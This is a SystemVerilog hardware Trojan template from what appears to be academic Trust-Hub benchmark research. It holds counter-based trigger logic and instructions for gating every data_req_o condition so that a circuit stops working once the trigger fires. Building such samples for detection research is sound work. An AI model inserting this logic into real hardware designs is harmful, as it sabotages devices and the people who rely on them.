/**
 * Sequential DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables operations by blocking data_req_o control signal
 *   
 * Trigger: Counter on data_req_o
 * Payload: Block data_req_o when trojan activates
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count trigger signal activations
        if (data_req_o) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        // Activate when threshold reached
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block data_req_o when trojan is active
//
// IMPORTANT: data_req_o is an INPUT signal - we CANNOT assign to it!
// Instead, we modify WHERE IT'S USED in conditional statements.
//
// Integration Script Must:
//   Find all occurrences of:
//     if (data_req_o) begin
//   
//   Replace with:
//     if (data_req_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: data_req_o && 0 = 0 (always false)
//   All operations controlled by data_req_o are blocked
//   Result: Denial of Service!